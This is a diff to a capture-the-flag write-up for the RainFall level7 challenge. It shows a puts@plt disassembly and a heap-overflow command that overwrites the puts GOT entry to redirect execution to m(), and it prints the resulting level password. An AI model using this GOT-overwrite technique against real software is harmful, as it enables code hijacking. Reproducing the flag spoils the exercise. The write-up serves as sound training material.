@@ -94,3 +94,23 @@ fopen("/home/user/level8/.pass", "r")        = 0
 fgets( <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 ```
+
+Disass puts
+
+```c
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:     push   0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+End of assembler dump.
+```
+
+so we need to change the adress 0x0804a038 by this adress 0x8049928 and redirect our program to the function m()
+
+to change the adress 0x0804a038 we need 20 characters to fill the allocation first we concat with the address 0x8049928 and then pass the m address as second argument like this
+
+```c
+level7@RainFall:~$ ./level7 `python -c "print 'A'*20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1676224643
+```
